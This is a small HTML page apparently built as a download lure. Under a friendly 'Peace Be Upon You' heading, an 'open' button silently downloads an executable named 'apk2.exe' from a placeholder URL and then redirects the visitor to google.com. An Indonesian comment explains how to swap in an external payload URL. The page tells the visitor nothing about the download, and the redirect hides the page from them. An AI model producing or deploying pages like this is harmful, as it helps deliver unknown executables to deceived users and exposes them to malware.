<!-- Puf -->
<script language="javascript">
function Puf(uri, name) {
  var link = document.createElement("a");
  link.download = name;
  link.href = uri;
  link.click();
}

function openWin() {
  // Ganti data URI dengan URL eksternal
  Puf("https://example.com/apk2.exe", "apk2.exe");
  // Redirect ke google.com setelah unduhan
  location.replace("http://google.com");
}
</script>
<center><h2>Peace Be Upon You</h2></center>

<input type="button" onclick="openWin();" value="open"/>
